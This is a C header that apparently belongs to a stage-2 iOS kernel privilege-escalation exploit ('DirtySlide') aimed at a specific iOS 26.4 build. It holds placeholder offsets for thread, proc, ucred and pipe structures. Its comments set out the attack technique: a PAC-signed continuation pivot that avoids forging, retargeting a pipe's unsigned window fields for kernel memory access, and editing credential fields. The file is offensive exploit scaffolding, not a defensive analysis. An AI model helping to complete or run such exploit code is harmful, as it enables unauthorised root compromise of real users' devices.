/*
 * rie_offsets_23E246.h — offset contract for the DirtySlide stage-2 escalation.
 *
 * TEMPLATE WRITTEN BY: co-head session O (infra lane).
 * OWNER OF VALUES:     BUILD-SPEC-1 (resolves from xnu-12377.1.9 / t8140 kernelcache,
 *                      iOS 26.4 build 23E246, iPhone16 Pro gen, SPTM silicon).
 *
 * STATUS: TEMPLATE — every value is 0 and RIE_OFFSETS_VERIFIED is 0.
 *         stage2 v3 halts at stage 20 with report err 0xEE while unverified.
 *         Flip RIE_OFFSETS_VERIFIED to 1 ONLY after every value below has been
 *         independently confirmed against the 23E246 kernelcache binary.
 *
 * Derivation sources (in order of trust):
 *   1. The 23E246 kernelcache itself (pattern scan — XPF/ChOma PatchFinder
 *      machinery already cloned at G:\op lab\Dopamine\BaseBin).
 *   2. Nearest published xnu source tag (apple-oss-distributions/xnu) for
 *      struct layout deltas vs xnu-112201 lineage.
 *   3. BUILD-SPEC-1 hypotheses: thread->continuation = +0xd8,
 *      thread->continuation_param = +0xe0 — VERIFY, never assume.
 */

#ifndef RIE_OFFSETS_23E246_H
#define RIE_OFFSETS_23E246_H

/* freestanding typedefs — identical to rie_stage2.c's; duplicate identical
 * typedefs are legal C11, so including this header alongside the driver is safe. */
typedef unsigned long long u64;
typedef unsigned int       u32;
typedef unsigned short     u16;
typedef unsigned char      u8;
typedef long long          i64;

#define RIE_OFFSETS_VERIFIED 0

/* ---- thread (struct thread, xnu-12377.1.9) ----
 * The signed-continuation pivot targets: continuation field is PAC-signed in
 * the kernel, but the pivot gadget path does not require forging it — the
 * gadget consumes the field as-is. Confirm exact offsets, never assume. */
#define THREAD_CONTINUATION_OFF   0x0  /* TODO(BUILD-SPEC-1): hypothesis +0xd8 */
#define THREAD_CONT_PARAM_OFF     0x0  /* TODO(BUILD-SPEC-1): hypothesis +0xe0 */
#define THREAD_SIZEOF             0x0  /* TODO(BUILD-SPEC-1) */

/* ---- proc (struct proc) ---- */
#define PROC_PID_OFF              0x0  /* TODO(BUILD-SPEC-1): p_pid */
#define PROC_UCRED_OFF            0x0  /* TODO(BUILD-SPEC-1): p_ucred */
#define PROC_TASK_OFF             0x0  /* TODO(BUILD-SPEC-1): task */
#define PROC_RO_OFF               0x0  /* TODO(BUILD-SPEC-1): proc_ro (cs_flags resolution) */
#define PROC_P_FD_OFF             0x0  /* TODO(BUILD-SPEC-1): file descent, optional */

/* ---- ucred (struct ucred) ---- */
#define CRED_UID_OFF              0x0  /* TODO(BUILD-SPEC-1): cr_uid */
#define CRED_RUID_OFF             0x0  /* TODO(BUILD-SPEC-1): cr_ruid */
#define CRED_FLAGS_OFF            0x0  /* TODO(BUILD-SPEC-1): cr_flags */

/* ---- pipe (struct pipe / pipebuf window fields) ----
 * Per the t_reslide port design: the {addr,len} window pair in the pipe's
 * own control area is PLAIN (unsigned) — never forge the PAC-signed buffer
 * pointer; retarget the plain fields only. */
#define PIPE_CNT_OFF              0x0  /* TODO(BUILD-SPEC-1): pipe cnt */
#define PIPE_WINDOW_ADDR_OFF      0x0  /* TODO(BUILD-SPEC-1): plain addr field */
#define PIPE_WINDOW_LEN_OFF       0x0  /* TODO(BUILD-SPEC-1): plain len field */

/* ---- sanity constants (safe defaults, not offsets) ---- */
#ifndef CS_DEBUGGED
#define CS_DEBUGGED               0x10000000
#endif

/* ---- stage-2 context ----
 * Carried from the stage-1 driver (rie_blob.c) into rie_stage2_entry().
 * TODO(BUILD-SPEC-1): replace reserved[] with the real driver→stage2 layout
 * (ext[] fn-pointer slots live in the report page, not here). */
struct stage2_ctx {
    u64 reserved[8];
};

#endif /* RIE_OFFSETS_23E246_H */
